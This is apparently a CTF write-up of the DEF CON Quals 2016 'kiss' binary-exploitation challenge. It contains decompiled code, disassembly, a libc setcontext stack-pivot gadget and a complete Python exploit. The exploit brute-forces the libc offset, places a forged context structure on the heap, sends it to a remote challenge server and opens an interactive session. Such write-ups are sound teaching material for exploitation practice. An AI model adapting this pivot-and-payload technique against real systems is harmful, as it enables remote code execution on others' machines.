---
layout: post
title: defcon qual 2016 kiss writeup
category: writeup
---

this problem is simple assembly challenge.


```c
void mamama()
{
  int v0; // ebx@1
  __int64 v1; // rdi@1
  unsigned __int64 v2; // rbx@1
  unsigned __int64 v3; // rax@1
  void *v4; // rbp@2
  unsigned __int64 v5; // rax@2
  unsigned __int64 buf; // [sp+8h] [bp-20h]@1

  write(1, "KISS - Keep It Simple Stupid\n", 0x1DuLL);
  v0 = open("/dev/urandom", 0);
  read(v0, &buf, 8uLL);
  close(v0);
  v1 = buf & 0x7FF;
  buf &= 0x7FFu;
  v2 = (unsigned __int64)malloc(v1) & 0xFFFFFFFFFFFFF000LL;
  write(1, "Buffer is around ", 0x11uLL);
  write_pointer(v2);
  write(1, "\n", 1uLL);
  write(1, "Binary is around ", 0x11uLL);
  write_pointer((unsigned __int64)mamama & 0xFFFFFFFFFFFFF000LL);
  write(1, "\n", 1uLL);
  write(1, "How big of a buffer do you want? ", 0x21uLL);
  v3 = sub_CE0();
  buf = v3;
  if ( v3 <= 0xA00 )
  {
    v4 = malloc(v3);
    write(1, "Waiting for data.\n", 0x12uLL);
    sub_C90(v4, buf);
    write(1, "What location shall we attempt? ", 0x20uLL);
    v5 = sub_CE0();
    buf = v5;
    if ( v2 <= v5 && v5 <= v2 + 0x1E00 )
    {
      write(1, "Good luck!\n", 0xBuLL);
      JUMPOUT(__CS__, ****(_QWORD ****)buf);
    }
    write(1, "Invalid location.\n", 0x12uLL);
    exit(0);
  }
  write(1, "Invalid size\n", 0xDuLL);
  exit(0);
}
```
I can receive heap pointer and binary base approximately, so it seems easy. but between write and JUMPOUT, there are terrible assembly codes.


```
.text:0000000000000A3F                 call    _write
.text:0000000000000A44                 mov     rax, [rsp+28h+buf]
.text:0000000000000A49                 xor     rbx, rbx
.text:0000000000000A4C                 xor     rcx, rcx
.......
.text:0000000000000A73                 xor     rsp, rsp
.......
.text:0000000000000ABE                 xorps   xmm14, xmm14
.text:0000000000000AC2                 xorps   xmm15, xmm15
.text:0000000000000AC6                 mov     rbx, [rax]
.text:0000000000000AC9                 mov     rcx, [rbx]
.text:0000000000000ACC                 mov     rdx, [rcx]
.text:0000000000000ACF                 jmp     qword ptr [rdx]

```
so all registers set to 0 except rax, rbx, rcx, rdx.
the critical problem is that WE CAN'T CALL ANY FUNCTIONS, also ret gadget can't work.

the first thing what i done is find gadget which controls rsp. there was one in libc, during makecontext.

```
.text:00000000000498B0                 mov     rsp, rbx
.text:00000000000498B3                 pop     rdi
.text:00000000000498B4                 test    rdi, rdi
.text:00000000000498B7                 jz      short loc_498C1
.text:00000000000498B9                 call    setcontext
.text:00000000000498BE                 mov     rdi, rax
```

in addition, we can control full registers by setcontext, so all i did was put context structure in heap and jump to 0x498B0.

but how to find libc offset? In x86-64, difference between pie_base and libc_base is constant for one machine (I guess it happens when va_randomize_space < 2, but I'm not sure) . In my local machine, offset difference was 0x5ea000, so I brute-force the offset between 0x500000 and 0x600000. to sure it was right offset, i used EB FE (infinite loop) gadget. here is my exploit code.

```python
import pwnbox
import struct
import random

debug = True
local = False

if local and debug:
    p = pwnbox.pipe.ProcessPipe('gdb -q ./kiss')
elif local:
    p = pwnbox.pipe.ProcessPipe('./kiss')
else:
    #p = pwnbox.pipe.SocketPipe('kiss_88581d4e20dc97355f1d86b6905f6103.quals.shallweplayaga.me', 3155)\
    p = pwnbox.pipe.SocketPipe('remote.goatskin.xyz',30009)

if local and debug:
    p.read_until('(gdb) ')
    p.write('r\n')

p.read_until('is around')
buf_base = int(p.read_until('\n'),16)
p.read_until('is around')
pie_base = int(p.read_until('\n'),16)

print '%x %x' % (buf_base, pie_base)
if local:
    libc_base = 0x7ffff7a15000
else:
    offset = random.randint(0x500000,0x600000) & 0xfff000
    #libc_base = pie_base - 0x5ea000
    libc_base = pie_base - offset
    print 'libc base : %x' % libc_base

if local and debug:
    m = buf_base + 0x50
else:
    m = (buf_base + random.randint(0,0x800)) & 0xffffffffffffffffffffffffffffff8
rip = pie_base + 0x870

cont = open('sample_context','rb')
cont_data = cont.read()
cont.close()

p.read_until('want?')
contextPayload = '\x00' * 0x200

#contextPayload = struct.pack('<QQ',m+24, libc_base + 0* 0x40FF5 + 1 * 0x498B0) + contextPayload[16:]
contextPayload = struct.pack('<QQ',m+24, libc_base + 1* 0xCF974 + 0 * 0x498B0) + contextPayload[16:]
contextPayload = contextPayload[0:0xE0] + struct.pack('<Q',m) + contextPayload[0xE8:]

r8 = 1
r9 = 2
r12 = 3
r13 = 4
r14 = 5
r15 = 15
rdi = 6
rsi = 7
rbp = 8
rbx = 9
rdx = 10
rcx = 11
retaddr = 0x12341234
rsp = m

regs = [r8, r9, 0, 0, r12, r13, r14, r15, libc_base + 0x17CCDB, rsi, rbp, rbx, rdx, 0, rcx, rsp, libc_base + 0x46640] # rdi + 0x28 ~ rdi + 0xA0


s = ''
for i in regs:
    s = s + struct.pack("<Q", i)

contextPayload = contextPayload[0:0x28] + s + contextPayload[0xB0:]

payload = struct.pack('<QQ',m+8,m+16) + contextPayload


print contextPayload.encode('hex')
p.write('%x\n' % len(payload))

p.read_until('Waiting for data.')
p.write(payload)

p.read_until('?')

p.write('%x\n' % m)


p.interact()
```